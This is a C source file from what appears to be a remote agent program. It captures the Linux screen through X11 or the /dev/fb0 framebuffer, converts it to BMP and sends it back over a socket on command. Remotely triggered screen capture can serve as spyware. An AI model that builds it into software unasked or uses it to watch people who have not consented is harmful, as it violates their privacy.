/*
 * screen.c - Screenshot capture for Linux.
 * Uses X11 XGetImage if HAVE_X11 is defined, else reads /dev/fb0 framebuffer.
 * Output format: BMP (same as Windows agent).
 */

#include "handlers.h"
#include "protocol.h"
#include "util.h"
#include "log.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef HAVE_X11
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#endif

/* BMP file header structures (packed) */
#pragma pack(push, 1)
typedef struct {
    uint16_t bfType;
    uint32_t bfSize;
    uint16_t bfReserved1;
    uint16_t bfReserved2;
    uint32_t bfOffBits;
} bmp_file_header_t;

typedef struct {
    uint32_t biSize;
    int32_t  biWidth;
    int32_t  biHeight;
    uint16_t biPlanes;
    uint16_t biBitCount;
    uint32_t biCompression;
    uint32_t biSizeImage;
    int32_t  biXPelsPerMeter;
    int32_t  biYPelsPerMeter;
    uint32_t biClrUsed;
    uint32_t biClrImportant;
} bmp_info_header_t;
#pragma pack(pop)

#ifdef HAVE_X11
static int screenshot_x11(SOCKET sock, int quality)
{
    Display *dpy;
    Window root;
    XImage *img;
    int screen_w, screen_h;
    int cap_w, cap_h;
    uint32_t row_size, pixel_size, total_size;
    char *bmp_data;
    bmp_file_header_t bfh;
    bmp_info_header_t bih;
    int x, y;

    dpy = XOpenDisplay(NULL);
    if (!dpy) {
        send_error_response(sock, "Cannot open X display");
        return -1;
    }

    root = DefaultRootWindow(dpy);
    screen_w = DisplayWidth(dpy, DefaultScreen(dpy));
    screen_h = DisplayHeight(dpy, DefaultScreen(dpy));

    cap_w = screen_w >> quality;
    cap_h = screen_h >> quality;
    if (cap_w < 1) cap_w = 1;
    if (cap_h < 1) cap_h = 1;

    /* Capture full screen - we'll downsample in software if needed */
    img = XGetImage(dpy, root, 0, 0, screen_w, screen_h, AllPlanes, ZPixmap);
    if (!img) {
        XCloseDisplay(dpy);
        send_error_response(sock, "XGetImage failed");
        return -1;
    }

    /* Build BMP - 24-bit bottom-up */
    row_size = ((cap_w * 3 + 3) / 4) * 4;
    pixel_size = row_size * cap_h;
    total_size = sizeof(bfh) + sizeof(bih) + pixel_size;

    bmp_data = (char *)malloc(total_size);
    if (!bmp_data) {
        XDestroyImage(img);
        XCloseDisplay(dpy);
        send_error_response(sock, "Out of memory");
        return -1;
    }

    memset(&bfh, 0, sizeof(bfh));
    bfh.bfType = 0x4D42;
    bfh.bfSize = total_size;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);

    memset(&bih, 0, sizeof(bih));
    bih.biSize = sizeof(bih);
    bih.biWidth = cap_w;
    bih.biHeight = cap_h;
    bih.biPlanes = 1;
    bih.biBitCount = 24;

    memcpy(bmp_data, &bfh, sizeof(bfh));
    memcpy(bmp_data + sizeof(bfh), &bih, sizeof(bih));

    /* Convert pixels (BMP is bottom-up, BGR order) */
    {
        char *pixels = bmp_data + sizeof(bfh) + sizeof(bih);
        int step = 1 << quality;

        for (y = 0; y < cap_h; y++) {
            char *row = pixels + (uint32_t)(cap_h - 1 - y) * row_size;
            int src_y = y * step;
            if (src_y >= screen_h) src_y = screen_h - 1;

            for (x = 0; x < cap_w; x++) {
                unsigned long pixel;
                int src_x = x * step;
                if (src_x >= screen_w) src_x = screen_w - 1;

                pixel = XGetPixel(img, src_x, src_y);
                row[x * 3 + 0] = (char)(pixel & 0xFF);         /* Blue */
                row[x * 3 + 1] = (char)((pixel >> 8) & 0xFF);  /* Green */
                row[x * 3 + 2] = (char)((pixel >> 16) & 0xFF); /* Red */
            }
        }
    }

    XDestroyImage(img);
    XCloseDisplay(dpy);

    send_binary_response(sock, bmp_data, total_size);
    free(bmp_data);
    return 0;
}
#endif /* HAVE_X11 */

static int screenshot_framebuffer(SOCKET sock, int quality)
{
    FILE *f;
    char line[256];
    int fb_w = 0, fb_h = 0, fb_bpp = 32;
    int cap_w, cap_h;
    uint32_t row_size, pixel_size, total_size;
    size_t fb_row_bytes, fb_size;
    char *fb_data, *bmp_data;
    bmp_file_header_t bfh;
    bmp_info_header_t bih;
    int x, y;

    /* Read framebuffer dimensions from sysfs */
    f = fopen("/sys/class/graphics/fb0/virtual_size", "r");
    if (f) {
        if (fgets(line, sizeof(line), f))
            sscanf(line, "%d,%d", &fb_w, &fb_h);
        fclose(f);
    }

    f = fopen("/sys/class/graphics/fb0/bits_per_pixel", "r");
    if (f) {
        if (fgets(line, sizeof(line), f))
            fb_bpp = atoi(line);
        fclose(f);
    }

    if (fb_w <= 0 || fb_h <= 0) {
        send_error_response(sock, "Cannot determine framebuffer size");
        return -1;
    }

    cap_w = fb_w >> quality;
    cap_h = fb_h >> quality;
    if (cap_w < 1) cap_w = 1;
    if (cap_h < 1) cap_h = 1;

    fb_row_bytes = (size_t)fb_w * (fb_bpp / 8);
    fb_size = fb_row_bytes * fb_h;

    fb_data = (char *)malloc(fb_size);
    if (!fb_data) {
        send_error_response(sock, "Out of memory for framebuffer");
        return -1;
    }

    f = fopen("/dev/fb0", "rb");
    if (!f) {
        free(fb_data);
        send_error_response(sock, "Cannot open /dev/fb0");
        return -1;
    }
    if (fread(fb_data, 1, fb_size, f) < fb_size) {
        /* Partial read is OK for some framebuffers */
    }
    fclose(f);

    /* Build BMP */
    row_size = ((cap_w * 3 + 3) / 4) * 4;
    pixel_size = row_size * cap_h;
    total_size = sizeof(bfh) + sizeof(bih) + pixel_size;

    bmp_data = (char *)malloc(total_size);
    if (!bmp_data) {
        free(fb_data);
        send_error_response(sock, "Out of memory for BMP");
        return -1;
    }

    memset(&bfh, 0, sizeof(bfh));
    bfh.bfType = 0x4D42;
    bfh.bfSize = total_size;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);

    memset(&bih, 0, sizeof(bih));
    bih.biSize = sizeof(bih);
    bih.biWidth = cap_w;
    bih.biHeight = cap_h;
    bih.biPlanes = 1;
    bih.biBitCount = 24;

    memcpy(bmp_data, &bfh, sizeof(bfh));
    memcpy(bmp_data + sizeof(bfh), &bih, sizeof(bih));

    /* Convert framebuffer (top-down BGRA/BGR) to BMP (bottom-up BGR) */
    {
        char *pixels = bmp_data + sizeof(bfh) + sizeof(bih);
        int step = 1 << quality;
        int bytes_pp = fb_bpp / 8;

        for (y = 0; y < cap_h; y++) {
            char *dst_row = pixels + (uint32_t)(cap_h - 1 - y) * row_size;
            int src_y = y * step;
            if (src_y >= fb_h) src_y = fb_h - 1;
            char *src_row = fb_data + (size_t)src_y * fb_row_bytes;

            for (x = 0; x < cap_w; x++) {
                int src_x = x * step;
                if (src_x >= fb_w) src_x = fb_w - 1;
                char *src_px = src_row + src_x * bytes_pp;

                dst_row[x * 3 + 0] = src_px[0]; /* Blue */
                dst_row[x * 3 + 1] = src_px[1]; /* Green */
                dst_row[x * 3 + 2] = src_px[2]; /* Red */
            }
        }
    }

    free(fb_data);
    send_binary_response(sock, bmp_data, total_size);
    free(bmp_data);
    return 0;
}

void handle_screenshot(SOCKET sock, const char *args)
{
    int quality = 0;

    if (args && args[0])
        quality = args[0] - '0';
    if (quality < 0 || quality > 2)
        quality = 0;

#ifdef HAVE_X11
    if (screenshot_x11(sock, quality) == 0)
        return;
    /* Fall through to framebuffer if X11 fails */
#endif

    if (screenshot_framebuffer(sock, quality) != 0) {
        send_error_response(sock, "No display available (no X11, no framebuffer)");
    }
}
